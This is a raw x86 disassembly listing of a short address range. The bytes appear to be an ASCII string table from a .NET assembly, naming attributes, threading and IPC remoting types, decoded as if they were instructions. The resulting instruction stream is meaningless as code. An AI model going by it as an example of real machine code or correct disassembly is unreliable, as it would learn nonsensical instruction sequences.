  4050e1:	gs data16 ins BYTE PTR es:[edi],dx
  4050e4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4050e9:	outs   dx,BYTE PTR ds:[esi]
  4050ea:	add    BYTE PTR [ecx+0x73],al
  4050ed:	jae    0x405154
  4050ef:	ins    DWORD PTR es:[edi],dx
  4050f0:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4050f4:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4050fc:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  405103:	jae    0x405178
  405105:	gs ins DWORD PTR es:[edi],dx
  405107:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40510b:	gs jae 0x405171
  40510e:	jb     0x405179
  405110:	jo     0x405186
  405112:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  405119:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  405120:	jae    0x405195
  405122:	gs ins DWORD PTR es:[edi],dx
  405124:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  405128:	gs popaw 
  40512b:	jne    0x405199
  40512d:	je     0x405170
  40512f:	ins    BYTE PTR es:[edi],dx
  405130:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  405137:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40513e:	jae    0x4051b3
  405140:	gs ins DWORD PTR es:[edi],dx
  405142:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  405146:	outs   dx,DWORD PTR ds:[esi]
  405147:	ins    DWORD PTR es:[edi],dx
  405148:	jo     0x4051ab
  40514a:	outs   dx,BYTE PTR ds:[esi]
  40514b:	jns    0x40518e
  40514d:	je     0x4051c3
  40514f:	jb     0x4051ba
  405151:	bound  esi,QWORD PTR [ebp+0x74]
  405154:	add    BYTE PTR gs:[ecx+0x73],al
  405158:	jae    0x4051bf
  40515a:	ins    DWORD PTR es:[edi],dx
  40515b:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40515f:	jb     0x4051d0
  405161:	fs jne 0x4051c7
  405164:	je     0x4051a7
  405166:	je     0x4051dc
  405168:	jb     0x4051d3
  40516a:	bound  esi,QWORD PTR [ebp+0x74]
  40516d:	add    BYTE PTR gs:[ecx+0x73],al
  405171:	jae    0x4051d8
  405173:	ins    DWORD PTR es:[edi],dx
  405174:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  405178:	outs   dx,DWORD PTR ds:[esi]
  405179:	jo     0x4051f4
  40517b:	jb     0x4051e6
  40517d:	addr16 push 0x74744174
  405183:	jb     0x4051ee
  405185:	bound  esi,QWORD PTR [ebp+0x74]
  405188:	add    BYTE PTR gs:[ecx+0x73],al
  40518c:	jae    0x4051f3
  40518e:	ins    DWORD PTR es:[edi],dx
  40518f:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  405193:	gs jb  0x405209
  405196:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40519d:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4051a4:	jae    0x405219
  4051a6:	gs ins DWORD PTR es:[edi],dx
  4051a8:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4051ac:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4051b4:	outs   dx,DWORD PTR ds:[esi]
  4051b5:	outs   dx,BYTE PTR ds:[esi]
  4051b6:	inc    ecx
  4051b7:	je     0x40522d
  4051b9:	jb     0x405224
  4051bb:	bound  esi,QWORD PTR [ebp+0x74]
  4051be:	add    BYTE PTR gs:[ecx+0x73],al
  4051c2:	jae    0x405229
  4051c4:	ins    DWORD PTR es:[edi],dx
  4051c5:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4051c9:	outs   dx,BYTE PTR ds:[esi]
  4051ca:	outs   dx,WORD PTR ds:[esi]
  4051cc:	jb     0x40523b
  4051ce:	popa   
  4051cf:	je     0x40523a
  4051d1:	outs   dx,DWORD PTR ds:[esi]
  4051d2:	outs   dx,BYTE PTR ds:[esi]
  4051d3:	popa   
  4051d4:	ins    BYTE PTR es:[edi],dx
  4051d5:	push   esi
  4051d6:	gs jb  0x40524c
  4051d9:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4051e0:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4051e7:	popa   
  4051e8:	je     0x40524f
  4051ea:	ins    BYTE PTR es:[edi],dx
  4051eb:	ins    BYTE PTR es:[edi],dx
  4051ec:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4051f4:	popa   
  4051f5:	arpl   WORD PTR [esi+edx*2+0x65],si
  4051f9:	jb     0x40526e
  4051fb:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  405202:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  405209:	gs jne 0x405280
  40520c:	jb     0x40526f
  40520e:	ins    BYTE PTR es:[edi],dx
  40520f:	push   edx
  405210:	gs jae 0x405282
  405213:	jne    0x405287
  405215:	arpl   WORD PTR [ebp+0x73],sp
  405218:	dec    esp
  405219:	popa   
  40521a:	outs   dx,BYTE PTR ds:[esi]
  40521b:	addr16 jne 0x40527f
  40521e:	addr16 gs inc ecx
  405221:	je     0x405297
  405223:	jb     0x40528e
  405225:	bound  esi,QWORD PTR [ebp+0x74]
  405228:	add    BYTE PTR gs:[ecx+0x73],al
  40522c:	jae    0x405293
  40522e:	ins    DWORD PTR es:[edi],dx
  40522f:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  405233:	gs ins BYTE PTR es:[edi],dx
  405235:	popa   
  405236:	jns    0x40528b
  405238:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40523f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  405246:	jae    0x4052bb
  405248:	gs ins DWORD PTR es:[edi],dx
  40524a:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  40524e:	gs jns 0x405297
  405251:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  405259:	bound  esi,QWORD PTR [ebp+0x74]
  40525c:	add    BYTE PTR gs:[edx+0x75],dl
  405260:	outs   dx,BYTE PTR ds:[esi]
  405261:	je     0x4052cc
  405263:	ins    DWORD PTR es:[edi],dx
  405264:	gs inc ebx
  405266:	outs   dx,DWORD PTR ds:[esi]
  405267:	ins    DWORD PTR es:[edi],dx
  405268:	jo     0x4052cb
  40526a:	je     0x4052d5
  40526c:	bound  ebp,QWORD PTR [ecx+0x6c]
  40526f:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  405277:	bound  esi,QWORD PTR [ebp+0x74]
  40527a:	add    BYTE PTR gs:[ecx+0x6e],cl
  40527e:	je     0x4052e5
  405280:	jb     0x4052f0
  405282:	popa   
  405283:	ins    BYTE PTR es:[edi],dx
  405284:	jae    0x4052dc
  405286:	imul   esi,DWORD PTR [ebx+0x69],0x54656c62
  40528d:	outs   dx,DWORD PTR ds:[esi]
  40528e:	inc    ecx
  40528f:	je     0x405305
  405291:	jb     0x4052fc
  405293:	bound  esi,QWORD PTR [ebp+0x74]
  405296:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40529b:	jne    0x405304
  40529d:	addr16 popa 
  40529f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4052a3:	je     0x405319
  4052a5:	jb     0x405310
  4052a7:	bound  esi,QWORD PTR [ebp+0x74]
  4052aa:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4052af:	jne    0x405318
  4052b1:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4052b9:	jae    0x4052bb
  4052bb:	inc    ebx
  4052bc:	outs   dx,DWORD PTR ds:[esi]
  4052bd:	ins    DWORD PTR es:[edi],dx
  4052be:	jo     0x405329
  4052c0:	ins    BYTE PTR es:[edi],dx
  4052c1:	popa   
  4052c2:	je     0x40532d
  4052c4:	outs   dx,DWORD PTR ds:[esi]
  4052c5:	outs   dx,BYTE PTR ds:[esi]
  4052c6:	push   edx
  4052c7:	gs ins BYTE PTR es:[edi],dx
  4052c9:	popa   
  4052ca:	js     0x40532d
  4052cc:	je     0x405337
  4052ce:	outs   dx,DWORD PTR ds:[esi]
  4052cf:	outs   dx,BYTE PTR ds:[esi]
  4052d0:	jae    0x405313
  4052d2:	je     0x405348
  4052d4:	jb     0x40533f
  4052d6:	bound  esi,QWORD PTR [ebp+0x74]
  4052d9:	add    BYTE PTR gs:[esi+0x53],dl
  4052dd:	push   esp
  4052de:	gs jae 0x405355
  4052e1:	push   esi
  4052e2:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  4052ea:	jb     0x405350
  4052ec:	gs jb  0x4052ef
  4052ef:	push   esp
  4052f0:	jb     0x405353
  4052f2:	arpl   WORD PTR [ebp+0x0],sp
  4052f5:	push   esp
  4052f6:	jb     0x405359
  4052f8:	arpl   WORD PTR [ebp+0x49],sp
  4052fb:	outs   dx,BYTE PTR ds:[esi]
  4052fc:	outs   dx,WORD PTR ds:[esi]
  4052fe:	jb     0x40536d
  405300:	popa   
  405301:	je     0x40536c
  405303:	outs   dx,DWORD PTR ds:[esi]
  405304:	outs   dx,BYTE PTR ds:[esi]
  405305:	add    BYTE PTR [ecx+eiz*2+0x74],al
  405309:	gs push esp
  40530b:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  405312:	pop    edi
  405313:	dec    esi
  405314:	outs   dx,DWORD PTR ds:[esi]
  405315:	ja     0x405317
  405317:	addr16 gs je 0x40537a
  40531b:	dec    ecx
  40531c:	outs   dx,BYTE PTR ds:[esi]
  40531d:	jbe    0x405380
  40531f:	jb     0x40538a
  405321:	popa   
  405322:	outs   dx,BYTE PTR ds:[esi]
  405323:	je     0x405368
  405325:	jne    0x405393
  405327:	je     0x40539e
  405329:	jb     0x405390
  40532b:	add    BYTE PTR [edi+ebp*2+0x53],dl
  40532f:	je     0x4053a3
  405331:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  405338:	imul   ebp,DWORD PTR [esi+0x67],0x6f464900
  40533f:	jb     0x4053ae
  405341:	popa   
  405342:	je     0x405394
  405344:	jb     0x4053b5
  405346:	jbe    0x4053b1
  405348:	fs gs jb 0x40534c
  40534c:	inc    ecx
  40534d:	jo     0x4053bf
  40534f:	inc    esp
  405350:	outs   dx,DWORD PTR ds:[esi]
  405351:	ins    DWORD PTR es:[edi],dx
  405352:	popa   
  405353:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  40535a:	inc    ebx
  40535b:	jne    0x4053cf
  40535d:	jb     0x4053c4
  40535f:	outs   dx,BYTE PTR ds:[esi]
  405360:	je     0x4053a6
  405362:	outs   dx,DWORD PTR ds:[esi]
  405363:	ins    DWORD PTR es:[edi],dx
  405364:	popa   
  405365:	imul   ebp,DWORD PTR [esi+0x0],0x61686e55
  40536c:	outs   dx,BYTE PTR ds:[esi]
  40536d:	fs ins BYTE PTR es:[edi],dx
  40536f:	gs fs inc ebp
  405372:	js     0x4053d7
  405374:	gs jo  0x4053eb
  405377:	imul   ebp,DWORD PTR [edi+0x6e],0x6e657645
  40537e:	je     0x4053c8
  405380:	popa   
  405381:	outs   dx,BYTE PTR ds:[esi]
  405382:	fs ins BYTE PTR es:[edi],dx
  405384:	gs jb  0x405387
  405387:	popa   
  405388:	fs fs pop edi
  40538b:	push   ebp
  40538c:	outs   dx,BYTE PTR ds:[esi]
  40538d:	push   0x6c646e61
  405392:	gs fs inc ebp
  405395:	js     0x4053fa
  405397:	gs jo  0x40540e
  40539a:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4053a1:	pop    edi
  4053a2:	inc    ebp
  4053a3:	js     0x405408
  4053a5:	gs jo  0x40541c
  4053a8:	imul   ebp,DWORD PTR [edi+0x6e],0x656a624f
  4053af:	arpl   WORD PTR [eax+eax*1+0x49],si
  4053b3:	outs   dx,BYTE PTR ds:[esi]
  4053b4:	je     0x4053e9
  4053b6:	xor    al,BYTE PTR [eax]
  4053b8:	inc    edx
  4053b9:	outs   dx,DWORD PTR ds:[esi]
  4053ba:	outs   dx,DWORD PTR ds:[esi]
  4053bb:	ins    BYTE PTR es:[edi],dx
  4053bc:	gs popa 
  4053be:	outs   dx,BYTE PTR ds:[esi]
  4053bf:	add    BYTE PTR [ecx+0x73],cl
  4053c2:	dec    esi
  4053c3:	jne    0x405431
  4053c5:	ins    BYTE PTR es:[edi],dx
  4053c6:	dec    edi
  4053c7:	jb     0x405420
  4053c9:	push   0x53657469
  4053ce:	jo     0x405431
  4053d0:	arpl   WORD PTR [ebp+0x0],sp
  4053d3:	push   esp
  4053d4:	jb     0x405437
  4053d6:	arpl   WORD PTR [ebp+0x57],sp
  4053d9:	popa   
  4053da:	jb     0x40544a
  4053dc:	imul   ebp,DWORD PTR [esi+0x67],0x63784500
  4053e3:	gs jo  0x40545a
  4053e6:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4d00
  4053ed:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x746e4500
  4053f5:	gs jb  0x4053f8
  4053f8:	inc    ebp
  4053f9:	jbe    0x405460
  4053fb:	outs   dx,BYTE PTR ds:[esi]
  4053fc:	je     0x405455
  4053fe:	popa   
  4053ff:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  405407:	add    BYTE PTR [ebx+0x65],dl
  40540a:	je     0x40540c
  40540c:	push   edi
  40540d:	popa   
  40540e:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  405416:	add    BYTE PTR [ebx+0x6c],al
  405419:	outs   dx,DWORD PTR ds:[esi]
  40541a:	jae    0x405481
  40541c:	add    BYTE PTR [ebp+0x78],al
  40541f:	imul   esi,DWORD PTR [eax+eax*1+0x57],0x41746961
  405427:	outs   dx,BYTE PTR ds:[esi]
  405428:	jns    0x40542a
  40542a:	push   edx
  40542b:	gs ins DWORD PTR es:[edi],dx
  40542d:	outs   dx,DWORD PTR ds:[esi]
  40542e:	je     0x405499
  405430:	outs   dx,BYTE PTR ds:[esi]
  405431:	addr16 push ebx
  405433:	gs jb  0x4054ac
  405436:	imul   esp,DWORD PTR [ebx+0x65],0x624f0073
  40543d:	push   0x52
  40543f:	data16 add BYTE PTR gs:[ebp+0x61],cl
  405444:	jb     0x4054b9
  405446:	push   0x54006c61
  40544b:	jns    0x4054bd
  40544d:	add    BYTE PTR gs:[edx+0x75],dl
  405451:	outs   dx,BYTE PTR ds:[esi]
  405452:	je     0x4054bd
  405454:	ins    DWORD PTR es:[edi],dx
  405455:	gs push esp
  405457:	jns    0x4054c9
  405459:	gs dec eax
  40545b:	popa   
  40545c:	outs   dx,BYTE PTR ds:[esi]
  40545d:	fs ins BYTE PTR es:[edi],dx
  40545f:	add    BYTE PTR gs:[edi+0x65],al
  405463:	je     0x4054b9
  405465:	jns    0x4054d7
  405467:	gs inc esi
  405469:	jb     0x4054da
  40546b:	ins    DWORD PTR es:[edi],dx
  40546c:	dec    eax
  40546d:	popa   
  40546e:	outs   dx,BYTE PTR ds:[esi]
  40546f:	fs ins BYTE PTR es:[edi],dx
  405471:	add    BYTE PTR gs:[ecx+0x63],al
  405475:	je     0x4054e0
  405477:	jbe    0x4054da
  405479:	je     0x4054ea
  40547b:	jb     0x40547d
  40547d:	inc    edi
  40547e:	gs je  0x4054d0
  405481:	bound  ebp,QWORD PTR [edx+0x65]
  405484:	arpl   WORD PTR [eax+eax*1+0x54],si
  405488:	jb     0x4054eb
  40548a:	arpl   WORD PTR [ebp+0x45],sp
  40548d:	jb     0x405501
  40548f:	outs   dx,DWORD PTR ds:[esi]
  405490:	jb     0x405492
  405492:	inc    ebp
  405493:	outs   dx,BYTE PTR ds:[esi]
  405494:	jbe    0x4054ff
  405496:	jb     0x405507
  405498:	outs   dx,BYTE PTR ds:[esi]
  405499:	ins    DWORD PTR es:[edi],dx
  40549a:	outs   dx,BYTE PTR gs:[esi]
  40549c:	je     0x40549e
  40549e:	inc    edi
  40549f:	gs je  0x4054e5
  4054a2:	jne    0x405516
  4054a4:	jb     0x40550b
  4054a6:	outs   dx,BYTE PTR ds:[esi]
  4054a7:	je     0x4054f9
  4054a9:	jb     0x40551a
  4054ab:	arpl   WORD PTR [ebp+0x73],sp
  4054ae:	jae    0x4054b0
  4054b0:	addr16 gs je 0x405513
  4054b4:	push   eax
  4054b5:	jb     0x405526
  4054b7:	arpl   WORD PTR [ebp+0x73],sp
  4054ba:	jae    0x40550a
  4054bc:	popa   
  4054bd:	ins    DWORD PTR es:[edi],dx
  4054be:	add    BYTE PTR gs:[edi+0x65],ah
  4054c2:	je     0x405523
  4054c4:	push   esp
  4054c5:	imul   esp,DWORD PTR [ebx+0x6b],0x6e490073
  4054cc:	je     0x405504
  4054ce:	xor    al,0x0
  4054d0:	push   ebx
  4054d1:	jns    0x405546
  4054d3:	je     0x40553a
  4054d5:	ins    DWORD PTR es:[edi],dx
  4054d6:	cs inc ebx
  4054d8:	outs   dx,DWORD PTR ds:[esi]
  4054d9:	ins    BYTE PTR es:[edi],dx
  4054da:	ins    BYTE PTR es:[edi],dx
  4054db:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4054e0:	outs   dx,BYTE PTR ds:[esi]
  4054e1:	jae    0x4054e3
  4054e3:	dec    eax
  4054e4:	popa   
  4054e5:	jae    0x40554f
  4054e7:	je     0x40554a
  4054e9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4054ed:	jae    0x405554
  4054ef:	je     0x405550
  4054f1:	dec    ecx
  4054f2:	je     0x405559
  4054f4:	ins    DWORD PTR es:[edi],dx
  4054f5:	add    BYTE PTR [ebx+0x79],dl
  4054f8:	jae    0x40556e
  4054fa:	gs ins DWORD PTR es:[edi],dx
  4054fc:	cs push ebx
  4054fe:	arpl   WORD PTR gs:[ebp+0x72],si
  405502:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  40550a:	arpl   WORD PTR [ecx+0x70],bp
  40550d:	popa   
  40550e:	ins    BYTE PTR es:[edi],dx
  40550f:	add    BYTE PTR [edi+0x69],dl
  405512:	outs   dx,BYTE PTR ds:[esi]
  405513:	outs   dx,DWORD PTR fs:[esi]
  405515:	ja     0x40558a
  405517:	dec    ecx
  405518:	fs outs dx,BYTE PTR gs:[esi]
  40551b:	je     0x405586
  40551d:	je     0x405598
  40551f:	add    BYTE PTR [edi+0x65],al
  405522:	je     0x405567
  405524:	jne    0x405598
  405526:	jb     0x40558d
  405528:	outs   dx,BYTE PTR ds:[esi]
  405529:	je     0x40552b
  40552b:	addr16 gs je 0x40558e
  40552f:	dec    esi
  405530:	popa   
  405531:	ins    DWORD PTR es:[edi],dx
  405532:	add    BYTE PTR gs:[ebx+0x79],dl
  405536:	jae    0x4055ac
  405538:	gs ins DWORD PTR es:[edi],dx
  40553a:	cs push edx
  40553c:	jne    0x4055ac
  40553e:	je     0x4055a9
  405540:	ins    DWORD PTR es:[edi],dx
  405541:	gs cs push edx
  405544:	gs ins DWORD PTR es:[edi],dx
  405546:	outs   dx,DWORD PTR ds:[esi]
  405547:	je     0x4055b2
  405549:	outs   dx,BYTE PTR ds:[esi]
  40554a:	addr16 cs inc ebx
  40554d:	push   0x656e6e61
  405552:	ins    BYTE PTR es:[edi],dx
  405553:	jae    0x405555
  405555:	inc    edx
  405556:	imul   ebp,DWORD PTR [esi+0x61],0x65537972
  40555d:	jb     0x4055d5
  40555f:	gs jb  0x4055a8
  405562:	outs   dx,DWORD PTR ds:[esi]
  405563:	jb     0x4055d2
  405565:	popa   
  405566:	je     0x4055dc
  405568:	gs jb  0x4055be
  40556b:	imul   ebp,DWORD PTR [esi+0x6b],0x766f7250
  405572:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x73795300
  40557a:	je     0x4055e1
  40557c:	ins    DWORD PTR es:[edi],dx
  40557d:	cs push edx
  40557f:	jne    0x4055ef
  405581:	je     0x4055ec
  405583:	ins    DWORD PTR es:[edi],dx
  405584:	gs cs push ebx
  405587:	gs jb  0x4055f3
  40558a:	popa   
  40558b:	ins    BYTE PTR es:[edi],dx
  40558c:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  405593:	cs inc esi
  405595:	outs   dx,DWORD PTR ds:[esi]
  405596:	jb     0x405605
  405598:	popa   
  405599:	je     0x40560f
  40559b:	gs jb  0x405611
  40559e:	add    BYTE PTR [ecx+edi*2+0x70],dl
  4055a2:	gs inc esi
  4055a4:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x76654c72
  4055ac:	gs ins BYTE PTR es:[edi],dx
  4055ae:	add    BYTE PTR [ebx+0x65],dh
  4055b1:	je     0x405612
  4055b3:	push   esp
  4055b4:	jns    0x405626
  4055b6:	gs inc esi
  4055b8:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x76654c72
  4055c0:	gs ins BYTE PTR es:[edi],dx
  4055c2:	add    BYTE PTR [edx+0x69],al
  4055c5:	outs   dx,BYTE PTR ds:[esi]
  4055c6:	popa   
  4055c7:	jb     0x405642
  4055c9:	inc    ebx
  4055ca:	ins    BYTE PTR es:[edi],dx
  4055cb:	imul   esp,DWORD PTR [ebp+0x6e],0x726f4674
  4055d2:	ins    DWORD PTR es:[edi],dx
  4055d3:	popa   
  4055d4:	je     0x40564a
  4055d6:	gs jb  0x40562c
  4055d9:	imul   ebp,DWORD PTR [esi+0x6b],0x766f7250
  4055e0:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x69444900
  4055e8:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4055ec:	outs   dx,BYTE PTR ds:[esi]
  4055ed:	popa   
  4055ee:	jb     0x405669
  4055f0:	add    BYTE PTR [ecx+0x43],cl
  4055f3:	ins    BYTE PTR es:[edi],dx
  4055f4:	imul   esp,DWORD PTR [ebp+0x6e],0x61684374
  4055fb:	outs   dx,BYTE PTR ds:[esi]
  4055fc:	outs   dx,BYTE PTR ds:[esi]
  4055fd:	gs ins BYTE PTR es:[edi],dx
  4055ff:	push   ebx
  405600:	imul   ebp,DWORD PTR [esi+0x6b],0x766f7250
  405607:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x65534900
  40560f:	jb     0x405687
  405611:	gs jb  0x405657
  405614:	push   0x656e6e61
  405619:	ins    BYTE PTR es:[edi],dx
  40561a:	push   ebx
  40561b:	imul   ebp,DWORD PTR [esi+0x6b],0x766f7250
  405622:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x61684300
  40562a:	outs   dx,BYTE PTR ds:[esi]
  40562b:	outs   dx,BYTE PTR ds:[esi]
  40562c:	gs ins BYTE PTR es:[edi],dx
  40562e:	push   ebx
  40562f:	gs jb  0x4056a8
  405632:	imul   esp,DWORD PTR [ebx+0x65],0x43490073
  405639:	push   0x656e6e61
  40563e:	ins    BYTE PTR es:[edi],dx
  40563f:	add    BYTE PTR [edx+0x65],dl
  405642:	imul   esi,DWORD PTR [bp+di+0x74],0x68437265
  40564a:	popa   
  40564b:	outs   dx,BYTE PTR ds:[esi]
  40564c:	outs   dx,BYTE PTR ds:[esi]
  40564d:	gs ins BYTE PTR es:[edi],dx
  40564f:	add    BYTE PTR [ecx+ebp*2+0x73],al
  405653:	arpl   WORD PTR [edi+0x6e],bp
  405656:	outs   dx,BYTE PTR ds:[esi]
  405657:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  40565c:	outs   dx,BYTE PTR ds:[esi]
  40565d:	jb     0x4056c4
  40565f:	imul   esi,DWORD PTR [bp+di+0x74],0x68437265
  405667:	popa   
  405668:	outs   dx,BYTE PTR ds:[esi]
  405669:	outs   dx,BYTE PTR ds:[esi]
  40566a:	gs ins BYTE PTR es:[edi],dx
  40566c:	add    BYTE PTR [ebx+0x65],dh
  40566f:	je     0x4056d0
  405671:	inc    ebp
  405672:	outs   dx,BYTE PTR ds:[esi]
  405673:	popa   
  405674:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
  405678:	popa   
  405679:	imul   esi,DWORD PTR [ebx+0x69],0x7645676e
  405680:	outs   dx,BYTE PTR gs:[esi]
  405682:	je     0x4056f7
  405684:	add    BYTE PTR [ebp+0x76],al
  405687:	outs   dx,BYTE PTR gs:[esi]
  405689:	je     0x4056d3
  40568b:	popa   
  40568c:	outs   dx,BYTE PTR ds:[esi]
  40568d:	fs ins BYTE PTR es:[edi],dx
  40568f:	gs jb  0x405692
  405692:	popa   
  405693:	fs fs pop edi
  405696:	inc    ebp
  405697:	js     0x405702
  405699:	je     0x405700
  40569b:	add    BYTE PTR fs:[eax+ecx*2],bh
  40569f:	popa   
  4056a0:	outs   dx,BYTE PTR ds:[esi]
  4056a1:	fs ins BYTE PTR es:[edi],dx
  4056a3:	gs push ebx
  4056a5:	je     0x405708
  4056a7:	outs   dx,BYTE PTR ds:[esi]
  4056a8:	fs inc ecx
  4056aa:	ins    BYTE PTR es:[edi],dx
  4056ab:	outs   dx,DWORD PTR ds:[esi]
  4056ac:	outs   dx,BYTE PTR ds:[esi]
  4056ad:	gs dec ebp
  4056af:	outs   dx,DWORD PTR ds:[esi]
  4056b0:	fs gs bound ebx,QWORD PTR ds:[edi+0x5f]
  4056b6:	xor    al,BYTE PTR [eax]
  4056b8:	jne    0x405728
  4056ba:	jne    0x40572f
  4056bc:	gs fs push eax
  4056bf:	popa   
  4056c0:	jb     0x405723
  4056c2:	ins    DWORD PTR es:[edi],dx
  4056c3:	add    BYTE PTR [ebx+0x6f],al
  4056c6:	ins    DWORD PTR es:[edi],dx
  4056c7:	jo     0x405732
  4056c9:	ins    BYTE PTR es:[edi],dx
  4056ca:	gs jb  0x405714
  4056cd:	outs   dx,BYTE PTR gs:[esi]
  4056cf:	gs jb  0x405733
  4056d2:	je     0x405739
  4056d4:	fs inc ecx
  4056d6:	je     0x40574c
  4056d8:	jb     0x405743
  4056da:	bound  esi,QWORD PTR [ebp+0x74]
  4056dd:	add    BYTE PTR gs:[eax+ebp*2+0x72],dl
  4056e2:	gs popa 
  4056e4:	add    BYTE PTR fs:[ebx+0x6c],dl
  4056e8:	gs gs jo 0x4056ec
  4056ec:	inc    ebx
  4056ed:	outs   dx,DWORD PTR ds:[esi]
  4056ee:	outs   dx,BYTE PTR ds:[esi]
  4056ef:	jae    0x405760
  4056f1:	ins    BYTE PTR es:[edi],dx
  4056f2:	gs inc ebx
  4056f4:	popa   
  4056f5:	outs   dx,BYTE PTR ds:[esi]
  4056f6:	arpl   WORD PTR [ebp+0x6c],sp
  4056f9:	inc    ebp
  4056fa:	jbe    0x405761
  4056fc:	outs   dx,BYTE PTR ds:[esi]
  4056fd:	je     0x405747
  4056ff:	popa   
  405700:	outs   dx,BYTE PTR ds:[esi]
  405701:	fs ins BYTE PTR es:[edi],dx
  405703:	gs jb  0x405706
  405706:	inc    ebx
  405707:	outs   dx,DWORD PTR ds:[esi]
  405708:	outs   dx,BYTE PTR ds:[esi]
  405709:	jae    0x40577a
  40570b:	ins    BYTE PTR es:[edi],dx
  40570c:	add    BYTE PTR gs:[ecx+0x64],ah
  405710:	fs pop edi
  405712:	inc    ebx
  405713:	popa   
  405714:	outs   dx,BYTE PTR ds:[esi]
  405715:	arpl   WORD PTR [ebp+0x6c],sp
  405718:	dec    ebx
  405719:	gs jns 0x40576c
  40571c:	jb     0x405783
  40571e:	jae    0x405793
  405720:	add    BYTE PTR [edi+0x72],dl
  405723:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  40572b:	push   edi
  40572c:	popa   
  40572d:	imul   esi,DWORD PTR [ebx+eax*2+0x61],0x61626c6c
  405735:	arpl   WORD PTR [ebx+0x0],bp
  405738:	push   esp
  405739:	push   0x64616572
  40573e:	push   eax
  40573f:	outs   dx,DWORD PTR ds:[esi]
  405740:	outs   dx,DWORD PTR ds:[esi]
  405741:	ins    BYTE PTR es:[edi],dx
  405742:	add    BYTE PTR [ecx+0x75],dl
  405745:	gs jne 0x4057ad
  405748:	push   ebp
  405749:	jae    0x4057b0
  40574b:	jb     0x4057a4
  40574d:	outs   dx,DWORD PTR ds:[esi]
  40574e:	jb     0x4057bb
  405750:	dec    ecx
  405751:	je     0x4057b8
  405753:	ins    DWORD PTR es:[edi],dx
  405754:	add    BYTE PTR [ebx+0x74],dl
  405757:	jb     0x4057c2
  405759:	outs   dx,BYTE PTR ds:[esi]
  40575a:	addr16 inc ebx
  40575c:	outs   dx,DWORD PTR ds:[esi]
  40575d:	ins    DWORD PTR es:[edi],dx
  40575e:	jo     0x4057c1
  405760:	jb     0x4057cb
  405762:	jae    0x4057d3
  405764:	outs   dx,BYTE PTR ds:[esi]
  405765:	add    BYTE PTR [ebp+0x71],al
  405768:	jne    0x4057cb
  40576a:	ins    BYTE PTR es:[edi],dx
  40576b:	jae    0x40576d
  40576d:	push   esp
  40576e:	jb     0x4057e9
  405770:	push   eax
  405771:	popa   
  405772:	jb     0x4057e7
  405774:	add    BYTE PTR gs:[edi+0x65],al
  405778:	je     0x4057ca
  40577a:	jb     0x4057eb
  40577c:	arpl   WORD PTR [ebp+0x73],sp
  40577f:	jae    0x4057c3
  405781:	jns    0x4057cc
  405783:	add    BYTE PTR fs:[ecx+0x64],al
  405787:	add    BYTE PTR fs:[ecx+0x73],al
  40578b:	jae    0x4057f2
  40578d:	ins    DWORD PTR es:[edi],dx
  40578e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  405792:	inc    edi
  405793:	gs je  0x4057db
  405796:	js     0x4057fd
  405798:	arpl   WORD PTR [ebp+0x74],si
  40579b:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  4057a2:	ins    DWORD PTR es:[edi],dx
  4057a3:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4057a7:	addr16 gs je 0x40580a
